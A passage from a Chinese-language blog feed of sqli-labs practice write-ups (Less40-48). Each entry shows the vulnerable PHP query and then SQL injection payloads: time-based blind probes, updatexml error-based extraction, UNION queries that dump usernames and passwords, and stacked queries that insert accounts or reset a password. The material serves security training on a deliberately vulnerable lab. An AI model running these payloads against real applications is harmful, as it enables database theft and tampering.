class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(3),0)#猜解字段名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less48</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less48/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less48/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>报错函数被注释了，只能用盲注的方式进行爆破</p><p><a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">8</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解数据库名称 ?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">29</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解数据表名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">20</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解字段名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'D'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less47</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less47/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less47/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式为单引号’ <a name="qjWYr"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1</p></blockquote><p>单引号’闭合 <a name="gX6OV"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less45</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/less45/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/less45/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$username</span>') and password=('<span class="token variable">$password</span>')"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现与Less44的区别为闭合方式为**’)  ** <a name="Ehstz"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度-1<span class="token string">') or if(length(database())=8,sleep(5),0)#猜解数据库名称 -1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度-1<span class="token string">') or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#猜解数据表名称-1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度-1<span class="token string">') or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(5),0)#猜解字段名称-1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容-1<span class="token string">') or if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="jCJOl"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less44</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$username</span>' and password='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现没有了报错回显，那就只能借助盲注的方式进行注入了</p><p><a name="Ehstz"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p><a name="jCJOl"></a></p><h2 id="拆解数据库名称长度"><a href="#拆解数据库名称长度" class="headerlink" title="拆解数据库名称长度"></a>拆解数据库名称长度</h2><p><code>-1' or if(length(database())=8,sleep(5),0)#</code> <a name="kObnI"></a></p><h2 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h2><p><code>-1' or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+</code> <a name="bZUJF"></a></p><h2 id="猜解数据表名称长度"><a href="#猜解数据表名称长度" class="headerlink" title="猜解数据表名称长度"></a>猜解数据表名称长度</h2><p><code>-1' or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#</code> <a name="kSZVm"></a></p><h2 id="猜解数据表名称"><a href="#猜解数据表名称" class="headerlink" title="猜解数据表名称"></a>猜解数据表名称</h2><p><code>-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(5),0)--+</code></p><p><a name="j47RV"></a></p><h2 id="猜解字段名称长度"><a href="#猜解字段名称长度" class="headerlink" title="猜解字段名称长度"></a>猜解字段名称长度</h2><p><code>-1' or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(5),0)#</code> <a name="qszZ6"></a></p><h2 id="猜解字段名称"><a href="#猜解字段名称" class="headerlink" title="猜解字段名称"></a>猜解字段名称</h2><p><code>-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(5),0)--+</code> <a name="aRdmK"></a></p><h2 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h2><p><code>-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less43</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less43/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less43/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$username</span>') and password=('<span class="token variable">$password</span>')"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less42不同的是闭合方式为’) <a name="VZI6o"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p><code>');insert into users values(98,'zhong','zhong')#</code></p><p><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code> <a name="jykDm"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>login_user=admin&amp;login_password=admin'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’admin’’’ at line 1</p></blockquote><p><a name="Os6ES"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">') or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">') or updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段login_password=-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less42</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$username</span>' and password='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关的注入点在密码登陆处，同时也存在堆叠注入 , 单引号闭合 <a name="I3o7P"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p><code>';insert into users values(98,'zhong','zhong')#</code></p><p><code>-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><p><a name="jykDm"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>login_user=admin'&amp;login_password=admin'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’admin’’’ at line 1</p></blockquote><p><a name="Os6ES"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">' or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1'</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">' or updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段login_password=-1'</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less41</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less41/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less41/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数字型，存在堆叠注入 <a name="fu7F3"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入，<strong>修改</strong>回Dumb账户原来的密码&amp;#x20;<br><code>?id=1')**; update** security.users set password='Dumb' where username='Dumb'--+</code><br>查询看是发现Dumb账户的密码变成了 ‘Dumb’<br><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p></blockquote><p>修改回去密码成功。 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code>没有报错提示<br><code>?id=1 and 1=1</code>显示正常<br>数字型注入 <a name="eZFGx"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">4</span>--+ ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+ 找回显点?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,3--+  爆破数据库名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less40</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less40/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less40/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式为**’)**。依旧存在堆叠注入 <a name="PPyxl"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入，<strong>修改</strong>Dumb账户的密码&amp;#x20;<br><code>?id=1')**; update** security.users set password='xiugai' where username='Dumb'--+</code></p><p>查询看是发现Dumb账户的密码变成了 ‘xiugai’<br><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>xiugai,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– 